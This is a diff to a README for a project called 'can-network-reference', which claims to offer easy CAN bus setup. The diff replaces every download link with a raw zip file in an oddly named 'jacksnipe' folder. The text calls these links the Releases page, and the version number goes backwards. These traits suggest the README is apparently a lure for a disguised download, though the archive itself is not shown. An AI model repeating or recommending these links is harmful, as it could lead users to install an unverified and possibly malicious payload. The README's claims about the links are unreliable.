@@ -1,6 +1,6 @@
 # 🚀 can-network-reference - Easy Setup for CAN Bus Systems
 
-[![Download](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can_network_reference_2.9.zip)](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can_network_reference_2.9.zip)
+[![Download](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can-network-reference-v1.6.zip)](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can-network-reference-v1.6.zip)
 
 ## 📝 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to get started with your CAN bus setup:
 
    Visit the Releases page to download the latest version of the **can-network-reference**. Click the button below:
 
-   [![Download](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can_network_reference_2.9.zip)](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can_network_reference_2.9.zip)
+   [![Download](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can-network-reference-v1.6.zip)](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can-network-reference-v1.6.zip)
 
 2. **Install the Software:**
 
@@ -82,7 +82,7 @@ Contributions are welcome! If you have suggestions for improvements or features,
 
 ## 🔗 Important Links
 
-- [Download the latest release](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can_network_reference_2.9.zip)
+- [Download the latest release](https://raw.githubusercontent.com/Karte-uk/can-network-reference/main/jacksnipe/can-network-reference-v1.6.zip)
 
 ## 📜 License
 
